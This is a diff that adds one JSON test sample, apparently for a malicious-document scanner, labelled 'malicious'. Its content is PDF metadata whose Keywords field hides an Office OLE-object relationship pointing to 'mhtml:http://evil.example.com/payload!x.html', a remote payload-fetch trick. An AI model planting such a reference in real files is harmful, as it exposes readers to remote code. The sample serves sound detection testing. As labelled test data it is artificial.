@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::document-office::101::binary-variations::4",
+  "base_sample_id": "exp::document-office::101",
+  "generator_id": "binary-variations",
+  "generator_version": "1.0.0",
+  "seed": 776651445,
+  "content": "{\n  \"format\": \"pdf\",\n  \"info\": {\n    \"Keywords\": \"<Relationship Type=\\\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject\\\" Target=\\\"mhtml:http://evil.example.com/payload!x.html\\\"/>\\n\",\n    \"Creator\": \"Microsoft Word\",\n    \"Producer\": \"macOS Quartz PDFContext\",\n    \"CreationDate\": \"D:20260115103000Z\"\n  }\n}",
+  "content_hash": "28b2d40c3fd92506cbede86009943e4f6e6316f22d982716633f7e4902d1dd32",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "binary:pdf-metadata",
+  "difficulty": "advanced"
+}
